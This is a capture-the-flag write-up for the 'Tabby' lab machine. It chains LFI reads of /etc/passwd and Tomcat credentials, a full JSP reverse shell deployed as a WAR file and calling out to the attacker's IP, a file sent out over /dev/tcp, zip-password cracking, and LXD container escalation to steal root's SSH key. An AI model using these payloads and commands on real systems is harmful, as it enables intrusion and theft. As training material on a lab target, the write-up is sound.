# CTF Writeup: Tabby

## Lab Description

Tabby is a easy difficulty Linux machine. Enumeration of the website reveals a second website that is hosted on the same server under a different vhost. This website is vulnerable to Local File Inclusion. Knowledge of the OS version is used to identify the `tomcat-users.xml` file location. This file yields credentials for a Tomcat user that is authorized to use the `/manager/text` interface. This is leveraged to deploy of a war file and upload a webshell, which in turn is used to get a reverse shell. Enumeration of the filesystem reveals a password protected zip file, which can be downloaded and cracked locally. The cracked password can be used to login to the remote machine as a low privileged user. However this user is a member of the LXD group, which allows privilege escalation by creating a privileged container, into which the host&amp;amp;#039;s filesystem is mounted. Eventually, access to the remote machine is gained as `root` using SSH.

---


## Reconaissance


An initial scan revealed the following information about the services running on the target machine.

```
nmap -A -p- --min-rate 10000 10.129.15.142 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:34 EDT
Nmap scan report for 10.129.15.142
Host is up (0.021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   16.84 ms 10.10.14.1
2   19.72 ms 10.129.15.142

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds
```

There is 2 http instances running on the target. One of them is an tomcat application running on :8080 and one is the webpage running on port 80, let's enumerate the webpage first.

There is an domain called megahosting.htb, let's map it to our target ip in /etc/hosts

```
sudo echo "10.129.15.142 megahosting.htb" | sudo tee -a /etc/hosts
```

Pressing on the "News" Tab redirects us to an breach website, in which there is an ?file= parameter in the URL. The Site is also quiet slow. Let's try LFI. It worked, we enumerated users on the target server!

```
curl http://megahosting.htb/news.php?file=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```
```
curl http://megahosting.htb/news.php?file=../../../../etc/passwd | grep /bin/bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1850  100  1850    0     0  50403      0 --:--:-- --:--:-- --:--:-- 51388
root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Enumerated endpoints of the tomcat application.

```
gobuster dir -u http://megahosting.htb:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://megahosting.htb:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

/manager directory requires authentication, since we have an LFI we can potentially find those credentials. 

Users are defined in /etc/tomcat9/tomcat-users.xml. Unfortunately this doesn't work.
When failing the authentication, the webpage actually tells us smth different than the initial website told us. The /tomcat-users.xml is in /conf/tomcat-users.xml, but this isn't the absolute path --> Let's search for it!

Found out that tomcat version 9 stores tomcat-users.xml in /usr/share/tomcat9/etc/tomcat-users.xml

```
curl http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

Retrieved tomcat credentials tomcat:$3cureP4s5w0rd123!

Unfortunately I wasn't able to login, so I decided to enumerate the /manager endpoint further. The Lab Description hinted at an /manager/text endpoint. Let's find it!

```
dirsearch -u http://megahosting.htb:8080/manager/                                                      
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                             
 (_||| _) (/_(_|| (_| )                                                                                      
                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/saitama/Desktop/Exploiting/OSCP_Prep/HTB/Linux/Tabby/reports/http_megahosting.htb_8080/_manager__25-10-25_16-39-20.txt

Target: http://megahosting.htb:8080/

[16:39:20] Starting: manager/                                                                                
[16:39:20] 404 -  746B  - /manager/%2e%2e;/test
[16:39:20] 401 -    2KB - /manager/html                                     
[16:39:20] 404 -  756B  - /manager/%2e%2e//google.com                       
[16:39:20] 200 -    2KB - /manager/..;/                                     
[16:39:28] 302 -    0B  - /manager/;login/  ->  /manager/html               
[16:39:28] 400 -  804B  - /manager/\..\..\..\..\..\..\..\..\..\etc\passwd   
[16:39:28] 302 -    0B  - /manager/;json/  ->  /manager/html                
[16:39:28] 302 -    0B  - /manager/;admin/  ->  /manager/html               
[16:39:28] 400 -  804B  - /manager/a%5c.aspx                                
[16:39:48] 401 -    2KB - /manager/html/                                    
[16:39:48] 401 -    2KB - /manager/html/config.rb
[16:39:48] 401 -    2KB - /manager/html/js/misc/swfupload//swfupload.swf    
[16:39:48] 401 -    2KB - /manager/html/cgi-bin/                            
[16:39:48] 401 -    2KB - /manager/html/js/misc/swfupload/swfupload.swf
[16:39:48] 401 -    2KB - /manager/html/js/misc/swfupload/swfupload_f9.swf  
[16:39:49] 302 -    0B  - /manager/images  ->  /manager/images/             
[16:39:49] 302 -    0B  - /manager/index.jsp  ->  /manager/html             
[16:39:50] 401 -    2KB - /manager/jmxproxy                                 
[16:40:09] 401 -    2KB - /manager/status                                   
[16:40:09] 401 -    2KB - /manager/status/
[16:40:09] 401 -    2KB - /manager/status/selfDiscovered/status             
[16:40:09] 401 -    2KB - /manager/status?full=true                         
[16:40:11] 401 -    2KB - /manager/text                                     
                                                                             
Task Completed
```

The file exists on the target, quickly checking up what it is. It's revealed that it permits us to interact with the server/execute commands. Although we will need to authenticate us first. I think I will need to restart my box environment in order for this to work, since we can't authenticate on the /manage panel.

The official documentation of tomcat has an PoC how to use /manager/text from tomcat, let's use it!

First of all we will need to assign username & password variable.

```
USERR=tomcat
PASSWORD_3='$3cureP4s5w0rd123!'
```

PoC

```
curl -u ${USERR}:${PASSWORD_3} http://megahosting.htb:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs

```

Those are java projects which got deployed, I'm assuming those are web application archives, we could compile an .war file reverse shell and upload it, if we are able to deploy projects aswell, let's find out if we can and how we can!

We can utilize following PoC in order to upload our crafted revshell.war script.

```
curl -u ${USERR}:${PASSWORD_3} -T webshell.war http://megahosting.htb:8080/manager/text/deploy?path=/webshell&update=true
```

I already have an PoC for an jsp-reverse-shell on my local machine, let's use this one and configure ur ip & port!

```
<%@page import="java.net.SocketTimeoutException"%>
<%@page import="java.util.Arrays"%>
<%@page import="java.net.Socket"%>
<%@page import="java.io.IOException"%>
<%@page import="java.io.OutputStream"%>
<%@page import="java.io.InputStream"%>
<%@page import="java.net.InetSocketAddress"%>

<%-- Copyright (c) 2021 Ivan Šincek --%>
<%-- v3.0 --%>
<%-- Requires Java SE v8 or greater, JDK v8 or greater, and Java EE v5 or greater. --%>
<%-- Works on Linux OS, macOS, and Windows OS. --%>

<%!
    public class ReverseShell {

        private InetSocketAddress addr    = null;
        private String            os      = null;
        private String            shell   = null;
        private byte[]            buffer  = null;
        private int               clen    = 0;
        private boolean           error   = false;
        private String            message = null;

        public ReverseShell(String addr, int port) {
            this.addr = new InetSocketAddress(addr, port);
        }

        private boolean detect() {
            boolean detected = true;
            this.os = System.getProperty("os.name").toUpperCase();
            if (this.os.contains("LINUX") || this.os.contains("MAC")) {
                this.os      = "LINUX";
                this.shell   = "/bin/sh";
            } else if (this.os.contains("WIN")) {
                this.os      = "WINDOWS";
                this.shell   = "cmd.exe";
            } else {
                detected     = false;
                this.message = "SYS_ERROR: Underlying operating system is not supported, program will now exit...\n";
            }
            return detected;
        }

        private String getMessage() {
            return this.message;
        }

        // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
        private void brw(InputStream input, OutputStream output, String iname, String oname) {
            int bytes = 0;
            try {
                do {
                    if (this.os.equals("WINDOWS") && iname.equals("STDOUT") && this.clen > 0) {
                        // for some reason Windows OS pipes STDIN into STDOUT
                        // we do not like that
                        // we need to discard the data from the stream
                        do {
                            bytes = input.read(this.buffer, 0, this.clen >= this.buffer.length ? this.buffer.length : this.clen);
                            this.clen -= this.clen >= this.buffer.length ? this.buffer.length : this.clen;
                        } while (bytes > 0 && this.clen > 0);
                    } else {
                        bytes = input.read(this.buffer, 0, this.buffer.length);
                        if (bytes > 0) {
                            output.write(this.buffer, 0, bytes);
                            output.flush();
                            if (this.os.equals("WINDOWS") && oname.equals("STDIN")) {
                                this.clen += bytes;
                            }
                        } else if (iname.equals("SOCKET")) {
                            this.error   = true;
                            this.message = "SOC_ERROR: Shell connection has been terminated\n";
                        }
                    }
                } while (input.available() > 0);
            } catch (SocketTimeoutException ex) {} catch (IOException ex) {
                this.error   = true;
                this.message = String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n", iname, oname);
            }
        }

        public void run() {
            if (this.detect()) {
                Socket       client  = null;
                OutputStream socin   = null;
                InputStream  socout  = null;

                Process      process = null;
                OutputStream stdin   = null;
                InputStream  stdout  = null;
                InputStream  stderr  = null;

                try {
                    client = new Socket();
                    client.setSoTimeout(100);
                    client.connect(this.addr);
                    socin  = client.getOutputStream();
                    socout = client.getInputStream();

                    this.buffer = new byte[1024];

                    process = new ProcessBuilder(this.shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
                    stdin   = process.getOutputStream();
                    stdout  = process.getInputStream();
                    stderr  = process.getErrorStream();

                    do {
                        if (!process.isAlive()) {
                            this.message = "PROC_ERROR: Shell process has been terminated\n"; break;
                        }
                        this.brw(socout, stdin, "SOCKET", "STDIN");
                        if (stderr.available() > 0) { this.brw(stderr, socin, "STDERR", "SOCKET"); }
                        if (stdout.available() > 0) { this.brw(stdout, socin, "STDOUT", "SOCKET"); }
                    } while (!this.error);
                } catch (IOException ex) {
                    this.message = String.format("ERROR: %s\n", ex.getMessage());
                } finally {
                    if (stdin   != null) { try { stdin.close() ; } catch (IOException ex) {} }
                    if (stdout  != null) { try { stdout.close(); } catch (IOException ex) {} }
                    if (stderr  != null) { try { stderr.close(); } catch (IOException ex) {} }
                    if (process != null) { process.destroy(); }

                    if (socin  != null) { try { socin.close() ; } catch (IOException ex) {} }
                    if (socout != null) { try { socout.close(); } catch (IOException ex) {} }
                    if (client != null) { try { client.close(); } catch (IOException ex) {} }

                    if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
                }
            }
        }
    }
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>

<%
    out.print("<pre>");
    // change the host address and/or port number as necessary
    ReverseShell sh = new ReverseShell("10.10.14.186", 1337);
    sh.run();
    if (sh.getMessage() != null) { out.print(sh.getMessage()); }
    sh = null;
    System.gc();
    out.print("</pre>");
%>
```

Next step is to convert it into an .war file


```
zip webshell.war jsp_reverse_shell.jsp
```

Now we can execute the command in order to upload our malicious script.

```
curl -u ${USERR}:${PASSWORD_3} -T webshell.war http://megahosting.htb:8080/manager/text/deploy?path=/webshell&update=true
[1] 49605
OK - Deployed application at context path [/webshell]

[1]  + done       curl -u ${USERR}:${PASSWORD_3} -T webshell.war
```

Since our script got successfully uploaded on the /webshell directory, let's start up our listener.

```
nc -lvnp 1337
```

View the file 


```
http://megahosting.htb:8080/webshell/jsp_reverse_shell.jsp
```

Gained RCE as user tomcat

```
nc -lvnp 1337                    
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.224.224] 57314
whoami
tomcat
```

Performing shell hardening

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Let's enumerate the web root /var/www/html, since /home/ash isn't viewable as user tomcat.

Found an interesting .zip file owned by user "ash" let's download it on our local machine.

On local machine

```
nc -lvnp 8888 > ash.zip          
listening on [any] 8888 ...
```

On the target machine

```
cat 16162020_backup.zip > /dev/tcp/10.10.14.186/8888
```

unzipping the files requires authentication, which I don't have yet.

```
unzip ash.zip         
Archive:  ash.zip
   creating: var/www/html/assets/
[ash.zip] var/www/html/favicon.ico password: 
password incorrect--reenter: 
   skipping: var/www/html/favicon.ico  incorrect password
   creating: var/www/html/files/
   skipping: var/www/html/index.php  incorrect password
   skipping: var/www/html/logo.png   incorrect password
   skipping: var/www/html/news.php   incorrect password
   skipping: var/www/html/Readme.txt  incorrect password
```

let's convert the zip file to hash value, utilizing an sub-tool of john the ripper called "zip2john".

```
zip2john ash.zip > ash.hash
ver 1.0 ash.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 ash.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 ash.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 ash.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** ash.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 ash.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 ash.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Since we now got the hash value, let's try & bruteforce the password for the .zip file.

```
john ash.hash --wordlist=/usr/share/wordlists/rockyou.txt                        
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (ash.zip)     
1g 0:00:00:01 DONE (2025-10-25 17:43) 0.5747g/s 5960Kp/s 5960Kc/s 5960KC/s adornadis..adamsapple:)1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Retrieved password admin@it

Logged into user ash.

```
tomcat@tabby:/var/www/html/assets$ su ash
su ash
Password: admin@it
```

Retrieved user.txt in /home/ash directory.


```
cb967b99df697f841fb93b194d9ae957
```

## Privilege Escalation


User is part of lxd, which means we can exploit it using alpine-builder.

```
ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Downloading the file on local machine.


```
git clone https://github.com/saghul/lxd-alpine-builder
```



```
sudo ./build-alpine
```

installing the .tar file which got build on the target server.

```
ash@tabby:~$ wget http://10.10.14.186/alpine-v3.13-x86_64-20210218_0139.tar.gz
<.10.14.186/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2025-10-25 22:22:45--  http://10.10.14.186/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.10.14.186:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64 100%[===================>]   3.11M  6.16MB/s    in 0.5s
```

First step is to prompt the following command and always neglect input

```
ash@tabby:~$ /snap/bin/lxd init
/snap/bin/lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: no
no
Do you want to configure a new storage pool? (yes/no) [default=yes]: no
no
Would you like to connect to a MAAS server? (yes/no) [default=no]: no
no
Would you like to create a new local network bridge? (yes/no) [default=yes]: no
no
Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: no
no
Would you like the LXD server to be available over the network? (yes/no) [default=no]: no
no
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] no
no
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
no
```

Next step is to actually import the image of alpine.


```
ash@tabby:~$ /snap/bin/lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
```

Recheck if it exists:


```
ash@tabby:~$ /snap/bin/lxc image list
/snap/bin/lxc image list
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
| alpine | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64       | CONTAINER | 3.11MB | Oct 25, 2025 at 10:27pm (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
```

Before executing the next command, we will need to create a default storage pool.


```
/snap/bin/lxc storage create default dir
```

Next we need to make the container privileged, and mount the filesystem, before starting the container.


```
ash@tabby:~$ /snap/bin/lxc init alpine mycontainer -c security.privileged=true -s default
< mycontainer -c security.privileged=true -s default
Creating mycontainer

The instance you are starting doesn't have any network attached to it.
  To create a new network, use: lxc network create
  To attach a network to an instance, use: lxc network attach
```
```
ash@tabby:~$ /snap/bin/lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
```
```
ash@tabby:~$ /snap/bin/lxc start mycontainer
```

Accessing the container

```
ash@tabby:~$ /snap/bin/lxc exec mycontainer /bin/sh
/snap/bin/lxc exec mycontainer /bin/sh
~ # ^[[22;5Rwhoami
whoami
root
```

Gained root shell and retrieved root's private key and saved it locally.


```
cat /mnt/root/root/.ssh/id_rsa
```

Logged into root via ssh.

```
ssh -i id_rsa root@megahosting.htb
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 25 Oct 2025 10:52:47 PM UTC

  System load:  0.0               Processes:               249
  Usage of /:   48.2% of 6.82GB   Users logged in:         0
  Memory usage: 21%               IPv4 address for ens160: 10.129.224.224
  Swap usage:   0%


283 updates can be installed immediately.
152 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Sep  7 15:48:53 2021
root@tabby:~#
```

Retrieved root.txt in /root directory.

```
1fb03e390b12ad26bce4e7c3981040e8
```
